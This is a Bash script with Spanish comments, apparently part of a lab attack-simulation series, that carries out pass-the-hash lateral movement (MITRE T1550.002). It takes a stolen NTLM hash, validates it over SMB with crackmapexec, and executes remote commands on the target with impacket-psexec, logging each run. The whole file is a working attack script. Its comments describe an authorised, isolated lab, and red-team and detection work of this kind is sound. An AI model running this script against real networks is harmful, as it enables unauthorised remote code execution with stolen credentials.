#!/usr/bin/env bash
# Ataque 3: Pass-the-Hash / movimiento lateral (MITRE T1550.002, T1021.002)
# Requiere haber obtenido previamente un hash NTLM valido (ej. via mimikatz/secretsdump
# en un ejercicio autorizado dentro del laboratorio aislado).
# Uso: ./attack3_pass_the_hash.sh <IP_DC_o_HOST> <USUARIO> <HASH_NTLM>
set -euo pipefail
source "$(dirname "$0")/_lib_log_ataque.sh"
TARGET="${1:?Uso: $0 <IP_OBJETIVO> <USUARIO> <HASH_NTLM>}"
USER="${2:?Falta usuario}"
NTHASH="${3:?Falta hash NTLM (formato LM:NT o solo NT)}"

INICIO=$(log_inicio)
echo "[+] Intentando autenticacion Pass-the-Hash contra ${TARGET}..."
# impacket-psexec exige el formato LM:NT (falla si solo se pasa el NT), a
# diferencia de crackmapexec que acepta el NT solo. Se normaliza aquí para
# que el usuario pueda invocar el script con cualquiera de los dos formatos.
if [[ "${NTHASH}" == *:* ]]; then
  FULLHASH="${NTHASH}"
else
  FULLHASH="aad3b435b51404eeaad3b435b51404ee:${NTHASH}"
fi
# crackmapexec / netexec para validar el hash vía SMB
# Dual-stack: Impacket/cme aceptan IPv6; el host se pasa entre corchetes en la
# forma user@[IPv6]. crackmapexec recibe la direccion tal cual.
if command -v crackmapexec &>/dev/null; then
  crackmapexec smb "${TARGET}" -u "${USER}" -H "${NTHASH}" || true
fi
# psexec.py de Impacket para ejecucion remota (movimiento lateral)
if command -v impacket-psexec &>/dev/null; then
  echo "whoami" | timeout 20 impacket-psexec -hashes "${FULLHASH}" "${USER}@$(brk "$TARGET")" 2>&1 | tee "/tmp/pth_$(date +%s).log" || true
fi
log_fin "pass_the_hash" "T1550.002" "${TARGET}" "${INICIO}" "1"
echo "[+] Ataque registrado en log_ataques.csv"
